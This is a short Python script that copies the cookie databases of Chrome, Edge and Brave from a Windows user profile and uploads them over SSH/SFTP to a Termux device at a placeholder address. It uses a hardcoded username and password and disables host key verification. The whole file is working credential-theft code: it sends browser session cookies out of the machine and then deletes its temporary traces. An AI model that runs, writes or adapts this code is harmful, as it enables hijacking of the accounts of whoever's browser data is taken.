import os
import shutil
import paramiko

# SSH connection details
TERMUX_IP = "192.168.x.x"  # Replace with Termux IP address
TERMUX_PORT = 8022  # Default Termux SSH port
USERNAME = "u0_a269"  # Termux username
PASSWORD = "7869"  # SSH password
REMOTE_PATH = "storage/downloads/"  # Path on Termux where cookies will be stored

# Browser cookie paths
BROWSER_COOKIE_PATHS = {
    "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Cookies"),
    "Edge": os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Cookies"),
    "Brave": os.path.join(os.getenv("LOCALAPPDATA"), r"BraveSoftware\Brave-Browser\User Data\Default\Cookies")
}

# Temporary folder to store cookies before transfer
temp_dir = os.path.join(os.getcwd(), "temp_cookies")
os.makedirs(temp_dir, exist_ok=True)

def check_and_copy_cookie(browser_name, cookie_path):
    """Check if cookie file exists and copy it to temp folder."""
    if os.path.exists(cookie_path):
        temp_cookie_path = os.path.join(temp_dir, f"{browser_name}_Cookies")
        shutil.copyfile(cookie_path, temp_cookie_path)
        print(f"{browser_name} cookies copied to temporary directory.")
        return temp_cookie_path
    else:
        print(f"{browser_name} cookie file not found.")
        return None

def transfer_cookies_via_ssh(local_file, browser_name):
    """Transfer cookie file to Termux via SSH."""
    try:
        # Initialize SSH client and connect
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(
            TERMUX_IP, 
            port=TERMUX_PORT, 
            username=USERNAME, 
            password=PASSWORD
        )

        # Use SFTP to upload the file
        sftp = ssh_client.open_sftp()
        remote_file_path = os.path.join(REMOTE_PATH, f"{browser_name}_Cookies")
        sftp.put(local_file, remote_file_path)
        print(f"{browser_name} cookies successfully transferred to Termux at {remote_file_path}")

        # Close the SFTP session and SSH connection
        sftp.close()
        ssh_client.close()
    except Exception as e:
        print(f"Failed to transfer {browser_name} cookies: {e}")

# Main process
for browser, cookie_path in BROWSER_COOKIE_PATHS.items():
    cookie_file = check_and_copy_cookie(browser, cookie_path)
    if cookie_file:
        transfer_cookies_via_ssh(cookie_file, browser)

# Cleanup
shutil.rmtree(temp_dir)
print("Temporary files cleaned up.")

